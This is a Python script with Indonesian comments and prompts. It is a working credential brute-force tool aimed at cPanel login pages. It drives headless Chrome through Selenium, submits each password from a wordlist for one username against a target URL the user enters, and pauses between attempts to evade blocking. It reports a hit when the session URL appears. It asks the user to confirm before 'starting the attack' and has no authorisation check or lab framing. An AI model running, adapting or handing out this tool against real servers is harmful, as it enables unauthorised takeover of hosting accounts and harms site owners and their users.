import time
import os
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException

# --- BANNER ---
GOLD = '\033[93m'
RESET = '\033[0m'
BANNER = r"""
 _____          _     _     _     _             _  _    ___ _____ 
|  ___|__  _ __| |__ (_) __| | __| | ___ _ __  | || |  / _ \___ / 
| |_ / _ \| '__| '_ \| |/ _` |/ _` |/ _ \ '_ \ | || |_| | | ||_ \ 
|  _| (_) | |  | |_) | | (_| | (_| |  __/ | | ||__   _| |_| |__) |
|_|  \___/|_|  |_.__/|_|\__,_|\__,_|\___|_| |_|___|_|  \___/____/ 
                                             |_____| 
"""
print(GOLD + BANNER + RESET)
# --- AKHIR BANNER ---

def test_login(target_url, username, password):
    """Mencoba login di background (headless) dan hanya mengembalikan True/False."""
    options = webdriver.ChromeOptions()
    # Browser akan berjalan di background (tidak terlihat)
    options.add_argument('--headless')
    options.add_argument('--no-sandbox')
    options.add_argument('--disable-dev-shm-usage')
    
    service = Service(ChromeDriverManager().install())
    driver = webdriver.Chrome(service=service, options=options)
    
    try:
        driver.get(target_url)
        
        user_field = driver.find_element(By.NAME, "user")
        pass_field = driver.find_element(By.NAME, "pass")
        user_field.send_keys(username)
        pass_field.send_keys(password)

        wait = WebDriverWait(driver, 10)
        login_button = wait.until(EC.element_to_be_clickable((By.ID, 'login_submit')))
        login_button.click()

        wait.until(EC.url_contains("cpsess"))
        
        return True # Login berhasil

    except TimeoutException:
        return False # Login gagal (timeout)
    except Exception:
        return False # Error lain, anggap gagal
    finally:
        driver.quit()

def get_user_config():
    print("--- Konfigurasi Brute-Force (Report Per Password) ---")
    target_url = input("Masukkan Target URL: ")
    if not target_url.startswith(('http://', 'https://')):
        target_url = 'https://' + target_url
    username = input("Masukkan Username: ")
    password_file = input("Masukkan path ke file password: ")
    if not os.path.exists(password_file):
        print(f"[!] Error: File '{password_file}' tidak ditemukan.")
        exit()
        
    print("\n--- Konfirmasi Konfigurasi ---")
    print(f"Target URL     : {target_url}")
    print(f"Username       : {username}")
    print(f"Password File  : {password_file}")
    print("Note: Browser akan berjalan di background dan melaporkan setiap percobaan.")
    
    confirm = input("\nApakah konfigurasi sudah benar? Mulai serangan? (y/n): ").lower()
    if confirm != 'y':
        exit()
        
    return target_url, username, password_file

def main():
    target_url, username, password_file = get_user_config()

    try:
        with open(password_file, 'r', encoding='utf-8', errors='ignore') as f:
            passwords = [line.strip() for line in f]
        print(f"\n[+] Berhasil memuat {len(passwords)} password.")
    except Exception as e:
        print(f"[!] Error saat membaca file password: {e}")
        exit()

    print(f"\n[+] Memulai brute-force di background...")

    for password in passwords:
        if test_login(target_url, username, password):
            print("\n" + "="*50)
            print(f"[!] SUKSES! PASSWORD DITEMUKAN DAN DIVERIFIKASI!")
            print(f"[!] Username : {username}")
            print(f"[!] Password : {password}")
            print("[!] Password ini telah terbukti membuka dashboard cPanel.")
            print("="*50)
            break
        else:
            # --- LAPORAN UNTUK SETIAP PASSWORD ---
            print(f"[-] Password '{password}' salah. Melanjutkan...")
            time.sleep(3) # Jeda 3 detik untuk menghindari blokir
    else:
        print("\n" + "="*50)
        print("[!] ANALISIS SELESAI. PASSWORD TIDAK DITEMUKAN.")
        print("="*50)

if __name__ == "__main__":
    main()
